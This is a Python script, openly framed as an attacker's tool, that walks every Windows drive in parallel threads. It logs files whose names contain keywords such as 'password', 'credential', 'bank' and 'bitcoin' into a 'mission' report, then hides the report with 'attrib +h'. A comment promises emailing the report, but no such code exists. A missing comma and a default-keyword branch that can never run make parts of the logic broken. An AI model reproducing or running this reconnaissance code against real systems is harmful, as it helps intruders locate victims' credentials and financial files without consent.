#I want to create a python script that searches for an item when been called upon

#Useful libraries that I would be working with -->
import os
import re
import win32api
import datetime
from threading import Thread

#Declaring the credential searcher class
class CredentialSearcher:
    def __init__(self, attacker = None, target = None):
        self.attacker = attacker
        self.target = target
        self.datetime = datetime.datetime.now().strftime("%H:%M:%S %p. %d %B, %Y")

        #You can add extra keywords of your choice
        self.keywords = ["secret", "finance", "business", "key", "credential", "password", "username", "account", "bank", "blockchain", "crypt", "bitcoin", "worth", "market", "privacy", "private", "confidential", 
           "complain", "schema", "execut", "idea", "mode", "crim", "money", "cash", "plan", "sec", "survey", "surveillance", "admin", "state", "affair", "spy", "man", "deal", "security", "staff", "employee"
           "contract", "endorse"]
        self.report = f"""{'~' * 30} CREDENTIAL SEARCHER REPORT {'~' * 30}

        ~~~ Mission Details ~~~
Attacker: {self.attacker}
Target: {self.target}
Time Stamp: {self.datetime}

           ~~~ Mission Briefing ~~~      \n"""
    
    #This function searches for the specified keywords
    def findFile(self, rootFolder, filename = None):
        if filename:
            pass
        else:
            filename = "Default Keywords"
        self.report += f"Search results for {filename} --> \n"
        try:
            for root, dirs, files in os.walk(rootFolder):
                for f in files:
                    if filename: #This checks if a file name was given to be searched for
                        if str(filename) in f:
                            stat = f"> File found: {os.path.join(root, f)} \n"
                            self.report += stat
                            print(stat)

                    else: #If theres none, it goes on to use the default keywords
                        for i in self.keywords: 
                            if i in f:
                                stat = f"> File found: {os.path.join(root, f)} \n"
                                self.report += stat
                                print(stat)
            else:
                stat = "file not found"
                self.report += stat
        except Exception as e:
            stat = f"An error occurred in find file function due to [{e}] \n"
            self.report += stat
            print(stat)
    
    #This gets the available drives in a system
    def getDrives(self):
        drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
        return drives

    #This threads the searches so that it searches the various drives simultaenously
    def byakugan(self, filename = None):
        threadList = []
        try:
            for drive in self.getDrives():
                thread = Thread(target = self.findFile, args = (drive, filename, )) #This calls the function and threads it based on the specified range
                threadList.append(thread)

            for thread in threadList: #This starts the thread
                thread.start()

            for thread in threadList: #This synchornizes the threading
                thread.join()
        except Exception as e:
            stat = f"An error occurred in byakugan function due to [{e}] \n"
            self.report += stat
            print(stat)

        #This section would write and send the report to the specified email
        file_name = f"{self.target}_credential_searcher.txt"
        with open(file_name, "w", encoding='utf-8') as dt:
            dt.write(self.report)
        location = f"{os.getcwd()}\\{file_name}"
        message = f"Attacker: {self.attacker} \nTarget: {self.target} \nCredential searcher is done and saved at {location}"
        print(message)
        
        os.system(f"attrib +h {file_name}")
        return

if __name__ == "__main__":
    #Commencing the code
    print("CREDENTIAL SEARCHER \n")

    print("Searching started...")

    attacker, target= "Uchiha Minato", "Konoha"
    search = CredentialSearcher(attacker = attacker, target = target).byakugan(None)

    print("\nExecuted successfully!!")


